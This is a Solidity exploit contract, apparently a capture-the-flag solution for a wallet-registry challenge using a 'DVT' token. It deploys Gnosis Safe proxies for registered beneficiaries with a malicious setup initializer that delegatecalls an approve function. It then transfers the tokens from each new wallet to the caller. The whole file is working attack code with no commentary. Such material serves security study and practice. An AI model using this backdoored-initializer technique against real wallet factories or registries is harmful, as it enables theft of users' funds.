// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";

contract RegistryAttack {
    address private gnosisSafeProxyFactory;
    address private masterCopyAddress;
    address private dvt;
    address private registry;
    uint256 constant amount = 10 * 10**18;

    constructor(
        address gnosisSafeProxyFactory_,
        address masterCopyAddress_,
        address registry_,
        address dvt_
    ) {
        gnosisSafeProxyFactory = gnosisSafeProxyFactory_;
        masterCopyAddress = masterCopyAddress_;
        registry = registry_;
        dvt = dvt_;
    }

    function approveTokens(address dvt_, address thisContract) external {
        IERC20(dvt_).approve(thisContract, amount);
    }

    function attack(address[] calldata beneficiaries) external {
        for (uint256 i = 0; i < beneficiaries.length; i++) {
            address[] memory owner = new address[](1);
            owner[0] = beneficiaries[i];
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owner,
                1,
                address(this),
                abi.encodeWithSelector(
                    RegistryAttack.approveTokens.selector,
                    dvt,
                    address(this)
                ),
                address(0),
                address(0),
                0,
                address(0)
            );
            GnosisSafeProxy proxy = GnosisSafeProxyFactory(
                gnosisSafeProxyFactory
            ).createProxyWithCallback(
                    masterCopyAddress,
                    initializer,
                    i,
                    IProxyCreationCallback(registry)
                );
            IERC20(dvt).transferFrom(address(proxy), msg.sender, amount);
        }
    }
}
